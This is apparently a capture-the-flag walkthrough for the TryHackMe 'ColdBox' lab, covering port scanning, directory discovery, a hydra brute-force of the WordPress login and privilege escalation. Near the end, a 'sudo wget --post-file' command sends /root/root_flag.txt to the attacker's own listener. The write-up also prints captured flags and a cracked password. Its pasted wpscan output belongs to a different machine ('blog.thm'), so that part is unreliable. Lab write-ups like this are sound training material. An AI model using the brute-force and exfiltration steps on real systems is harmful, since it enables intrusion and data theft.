# ColdBox

<div align="left">

<figure><img src=".gitbook/assets/image.png" alt="" width="168"><figcaption><p><a href="https://tryhackme.com/room/colddboxeasy">https://tryhackme.com/room/colddboxeasy</a></p></figcaption></figure>

</div>

🔗 [ColdBox](https://tryhackme.com/room/colddboxeasy)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.100.105`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.100.105 coldbox.thm" >> /etc/hosts

mkdir thm/coldbox.thm
cd thm/coldbox.thm
mkdir {nmap,content,exploits,scripts}

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 coldbox.thm
PING coldbox.thm (10.10.100.105) 56(84) bytes of data.
64 bytes from coldbox.thm (10.10.100.105): icmp_seq=1 ttl=63 time=65.4 ms
64 bytes from coldbox.thm (10.10.100.105): icmp_seq=2 ttl=63 time=61.1 ms
64 bytes from coldbox.thm (10.10.100.105): icmp_seq=3 ttl=63 time=60.5 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix, while Windows systems usually have a TTL of 128 secs.

Of course, start to check information scanning open ports:

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 coldbox.thm -oG nmap/port_scan
```

```bash
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 63
4512/tcp open  unknown syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 2 open ports on the machine: 80, 4512

Now, we need to search which services are running on open ports:

```bash
nmap -p80,4512 -n -Pn -vvv -sCV --min-rate 5000 coldbox.thm -oN nmap/open_port
```

```bash
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4512/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNmVtaTpgUhzxZL3VKgWKq6TDNebAFSbQNy5QxllUb4Gg6URGSWnBOuIzfMAoJPWzOhbRHAHfGCqaAryf81+Z8=
|   256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/fNq/6XnAxR13/jPT28jLWFlqxd+RKSbEgujEaCjEc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Task 3 - User flag?

Then we can start to see website (port 80):

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

we can see that's a wordpress web site, then we can try to see page source for checking information disclosure.

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

but we don't find precious info.

Another good thing to do, is find hidden paths on website using gobuster

```
gobuster dir -u coldbox.thm -w /usr/share/wordlists/dirb/common.txt
```

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Very good, we can start to check these web dir:

/hidden/

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Very good, there're precious info about usernames: C0ldd, Hugo and Philip.

We can confirm it watching error message at login in a default login path for wordpress: /wp-admin/

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Finally the's another good info

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

If we don't waste time, we can use wpscan to find user list, but we'll take it if we take results with our three users, then try to login with C0ldd/Hugo/Philip:password123 (what we've see in the hidden path).

Nothing to do, we need to use brute force attack.

Then, we save them in a file called users.txt, and run hydra with a password wordlist to take a brute force attack:

```bash
echo "C0ldd\nHugo\nPhilip" > users.txt
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt coldbox.thm -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

<figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
C0ldd:9876543210
{% endhint %}

Now we can use this credentials to log in wordpress and ssh.





We can launch wp-scan to give info from wordpress:

```bash
wpscan --url http://blog.thm -e u 
```

```bash
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:01:14 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:01:14

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)
```





We're in, try to find user.txt flag using find command:\


```bash
find / -type f -iname "*flag.txt" 2>/dev/null
```

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>🚩 Flag 1 (user_flag.txt)</summary>

057c67131c3d5e42dd5cd3075b198ff6

</details>

### Task 4 - Root flag?

We can do sudo -l command to discover user's permissions.











<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption><p>find IP and listen on port 4444</p></figcaption></figure>

```bash
sudo /usr/bin/wget http://10.9.80.228:4444 --post-file=/root/root_flag.txt
```

<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

<div align="left">

<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

</div>

Well done! Root flag found!

<details>

<summary>🚩 Flag 2 (root_flag.txt)</summary>

b1b968b37519ad1daa6408188649263d

</details>
